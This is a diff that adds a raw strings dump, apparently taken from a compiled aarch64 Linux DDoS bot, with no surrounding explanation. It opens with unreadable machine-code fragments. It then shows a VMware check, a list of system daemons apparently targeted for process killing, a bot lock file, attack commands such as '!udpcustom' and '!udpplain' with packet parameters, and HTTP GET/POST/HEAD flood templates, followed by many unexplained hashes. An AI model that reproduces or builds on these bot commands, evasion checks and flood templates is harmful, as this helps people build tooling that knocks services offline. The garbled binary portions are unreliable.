@@ -1,0 +1,281 @@
+=,@^8 
+^8+P^8*`^8
+n)p^8?
+(@9D@6
+:PNszPN
+9a @9!
+9a$@9!
+9a(@9!
+9a,@9!
+9a0@9!
+9a4@9!
+9a8@9!
+9a<@9!
+TAk{8 
+az@y!T
+@9g"@9$ 
+@9b.@9i6@9% 
+@9h:@9j>@9& 
+a&@9' 
+a*@9A 
+i"8 |@
+5 4@9@
+`hfxchf
+_8(hn8
+h`8"h 8
+hb8#hb8B
+hc8%hc8
+hb8$h`8
+hf8$hb8
+"ka8`ja8_
+kB0DzH
+he8'i%8
+`&@9c"@9
+R! 	S!|
+/sys/class/dmi/id/product_name
+VMware
+/dev/null
+/lib/systemd/systemd-journald
+/lib/systemd/systemd-udevd
+/usr/lib/accountsservice/accounts-daemon
+/usr/lib/snapd/snapd
+/usr/lib/upower/upowerd
+/usr/lib/packagekit/packagekitd
+/usr/lib/policykit-1/polkitd
+/usr/lib/fwupd/fwupd
+/usr/lib/boltd/boltd
+/usr/lib/udisks2/udisksd
+/usr/sbin/cron
+/usr/sbin/rsyslogd
+/usr/sbin/sshd
+/usr/sbin/NetworkManager
+/usr/sbin/cupsd
+/usr/bin/dbus-daemon
+26a8d078cea5dad2af3b9bea9ad9c8c7afe75495b73036eee27b895c654a5652
+24015a5e7d9290920ec9711ce3c7463242c61405c562de1ac9489bff307336ec
+/proc/self/exe
+/proc/net/tcp
+/proc/%s/cmdline
+/proc/%s/comm
+systemd
+kthreadd
+kworker
+ksoftirqd
+watchdog
+migration
+0123456789abcdef
+/proc/%s/exe
+fd00e82a0a3d86af73deacaa9df16432
+/dev/shm/
+/var/run/
+/bin/busybox
+/bin/sh
+/proc/%s/status
+/proc/%s/fd/
+/dev/console
+/proc/
+socket:
+a0739d51cc065a4d8fbde03f42eccf345ff4f0e161933f883753c8675ac5f4f8
+0aa61cb3a652cca0292513bbca523c91ff53f43bb5b778025f70acbbe460b240
+061d17a496a5aee21cc116a4ceca6721a597cec3ffc8a3892e15483153b53335
+e828331e0a815a48be0887dd9c996899fb16209726804ac89899f5a4fcd61614
+3cc942198b12b069149d5435a3adb8a53ae36b82cdcf05ab5818bceb268bff80
+a77b9133fa23a3b4f087fceae4e5b71c47f4fa703ff2bc06b4c9c54716785ccb
+ccd759f4e20b7e1819c70d3d0947f82511423a50af52e71df0b52f332a7b2c1a
+627d1030f75d6c3601a22f6c10ec78bfcd7c1ab4563c27bb65ad1c763d3ca6f066c70e8aa1894005594614e84750c4cc
+9f1092510dcccdb5874175e1f681bd6abf5863ccd6b219eb4eef748c18640354
+6677f93bc69f001a80f397c43355ea51b94e97a3421a072435498409204888187b1837d17ea4a569be16f99007594a36
+5de7c8f5a495d71db82258bad213deabd6fe2972ca7794931c6f77ffd9600870a6c700ed6a6c151d653c1d9c0f169f7e
+d2ce16ef96c4a2f68d445d592e7ebee5a3c9052feb3fd66437702d5dffe14ed740b7c594e3a7d3e04db5dc1694299cbc
+08b4b97ab9539aafec08118d78ead3a0d258b391599f853a1f9d4e1e14359498
+462ed0ca19a2a242c888359ab5dd13c9947a7f07dee87f6c90ec3b01f1492cca
+d619ed62256e50b4bb191cd9ee5e929e05819b608095b986559145748de6cc74
+3ba48c8fc99fe60a8e00e11f96ae6f3ceddee362443b2de85221bca121b2bca62e87494704555d2e776bea3a214a8517
+d00e1e3217d50a643928f93f42885282937e08f980fc3deb893bb3e8436ab0d2b392ab5c01638658cd82181a0095b173
+b43ed9347ff372c00bb33e297f71c6e499e52d13d70f7ca8d21d39f256dd5d7f
+03754966d64a3cc3173e1b56c45e7404668b8310e9fbdacaa07bfcd10b7a8081
+3aae4cd9f22a3a8973dca69820b63dedc60b5704efc047317bde5bd0c093618b
+a29a1a318af843dedafaabee63660f90152737745e636109046e1ecbb65ab48c
+bed6aaed9f9aa3ece7c3f66be4c83ba10ff43b0f9095d7110421fd6605550986
+39bca43c052af88c001e810dac1897e3c66b41a861b346c90d4045fbcf8924dd
+10f88eb24211f941638fa58d96b5d99259e0ea995f19fadfcb85a72172edbb5f
+27707a49472c8d6a0a889c77081096fefeb8a7b53157180983b1f4b7fc3bd7bb
+a68a73b1ef3db59303ebac79233274a276544d58438e735e1375812d7fd44fed
+d25076cc6471cb0f7bd7204e7390ba2ea147cb6eb53b018d9618d34967148d29
+a170dc7990d0b0454cb81486eda15d857cbac40d351d4543eb233c0b1368b279
+652e1785a48d315e4a36a27c2566d84c14f13c31155cdb04685b420f37ed1ed1
+0e0db3506ff843db9bfeff3144ba1fd3ca345626c8adf5cbb5d9d1b224c66947
+6c23c9b4f83d37fedcee506c28f743f1b17964a27d299bd1ce4c76715e50151f
+9663df3885b8caed9368d30a183f9e8a5af421a75c52cd2120a9624568997505
+a9057626347337c519614e312179214a5237d669429553a32b70287843a25cf2
+d14d57a9902c189db1537c4178b3d025fa50df15f01a2fe12274e82243b7628b
+0f789e7cf8a1a40159b1bc4b228fcfd7342dda0ce0264f1a498bef297f88b891
+c6370099bee93ce7c4b117f7949f9edd0ede5c2a319e0e94b9776611eb65a88b
+dab8006ffa61052f265e08118dd3c1b920b14338f06604cb179066d29add7032
+848e43671490fd10be19a793e3122be0244fa8542affacdb7ec56e2726169c14
+22bcc89516fc6eb00a9d218fb4e3535bea535d1746aa216c8362c818d571a4ef
+1e423c52835a97504bc2e05083282b3320f0b2d7041a8f12f70e17d590748a5a
+afd3abaad4b83bee96efb0931a512a71444b767332ed05fb70fbd423e0a9cecf
+245a92b5907fe2eaccc4ac161445e05981e204ed1519a2643fafd4d4d1507855
+883736a19a505b93a1ecad5e1d7f2ea53580c33b56915f13426b186e16806670
+f5cae8edf85cf396c7a0cdba057619b64e6e01a564af14530bbfbe0669ce61e7
+820b4350a45ba2d5de53fb492c21f56e4dbef2770c72007cc749a4fe2876731d
+ae38f011bfc0fce83fb2aba279034a1ee9a3f0c7cc851fb26e9907478e8aeb41
+f196f8635ca1894c45e1421df77a4ae55c05b3c92226573136a9e1c9673bf4e9
+b58e1bd69a3f142421707d83ab5ee445f250adfbcf54f552e25409fc36ba1315
+6608175db5b7f2c984136c49ef553612c45b7805ad87dca7ac57e87db520ae42
+39470bce61cad7596286c52d37c1f0f1980c24ebcdaf6fad5edc60c524053404
+20c3fadda508b38e9760fb0721226160e50559ca8f887f04243b94f7f0652002
+3150ee81164bf0bd81f9dd57839b9710a052f77e888ec4e4e2475b41be41913f
+e95d68748b95258a9472afab7b90fc15967b9d00eaa8e5464c8ca7d10ba7a9d3
+18523939ffef148e61362f3534e381283f7bb9026a8e7cd17f9acbc2ea133fb8
+5754e69b3c51098b5c920d24e314ef2abda81510b359e0f788937455aaa7de54
+95f0d42d6cf96ff5d10e9849f10f5d147f7d4db71389c956bca2fa0fa3d544bd0fdd5ee6fedd243d587811ffdd55a0d3
+ca02264196d2444f307547d9d6758270f0230b1853eb4b82dc97b0f29401e04f
+aarch64
+/tmp/.bot_lock
+42480e8feede0e323710211cf2ad792330fc5711be8867891886ec15be8ad601
+pong %s
+!udpcustom
+!udpplain
+%*s %31s %d %511[^
+%*s %31s %d %d %511[^
+psize=
+srcport=
+proto=
+payload=
+gport=
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110
+GET / HTTP/1.1
+Host: %s
+User-Agent: %s
+Connection: keep-alive
+POST / HTTP/1.1
+Host: %s
+User-Agent: %s
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+data=random_data
+HEAD / HTTP/1.1
+Host: %s
+User-Agent: %s
+Connection: keep-alive
+%d.%d.%d.%d
+%x:%x:%x:%x:%x:%x:%x:%x
+%x:%x:%x:%x:%x:%x:%d.%d.%d.%d
+/etc/hosts
+/etc/services
+/etc/resolv.conf
+options
+ndots:
+attempts:
+timeout:
+nameserver
+domain
+search
+127.0.0.1
+__kernel_clock_gettime
+LINUX_2.6.39
+-0X+0X 0X-0x+0x 0x
+-+   0X0x
+(null)
+/proc/se
+0123456789ABCDEF
+No error information
+Illegal byte sequence
+Domain error
+Result not representable
+Not a tty
+Permission denied
+Operation not permitted
+No such file or directory
+No such process
+File exists
+Value too large for data type
+No space left on device
+Out of memory
+Resource busy
+Interrupted system call
+Resource temporarily unavailable
+Invalid seek
+Cross-device link
+Read-only file system
+Directory not empty
+Connection reset by peer
+Operation timed out
+Connection refused
+Host is down
+Host is unreachable
+Address in use
+Broken pipe
+I/O error
+No such device or address
+Block device required
+No such device
+Not a directory
+Is a directory
+Text file busy
+Exec format error
+Invalid argument
+Argument list too long
+Symbolic link loop
+Filename too long
+Too many open files in system
+No file descriptors available
+Bad file descriptor
+No child process
+Bad address
+File too large
+Too many links
+No locks available
+Resource deadlock would occur
+State not recoverable
+Previous owner died
+Operation canceled
+Function not implemented
+No message of desired type
+Identifier removed
+Device not a stream
+No data available
+Device timeout
+Out of streams resources
+Link has been severed
+Protocol error
+Bad message
+File descriptor in bad state
+Not a socket
+Destination address required
+Message too large
+Protocol wrong type for socket
+Protocol not available
+Protocol not supported
+Socket type not supported
+Not supported
+Protocol family not supported
+Address family not supported by protocol
+Address not available
+Network is down
+Network unreachable
+Connection reset by network
+Connection aborted
+No buffer space available
+Socket is connected
+Socket not connected
+Cannot send after socket shutdown
+Operation already in progress
+Operation in progress
+Stale file handle
+Remote I/O error
+Quota exceeded
+No medium found
+Wrong medium type
+Multihop attempted
+Required key not available
+Key has expired
+Key has been revoked
+Key was rejected by service
+.shstrtab
+.rodata
+.init_array
+.fini_array
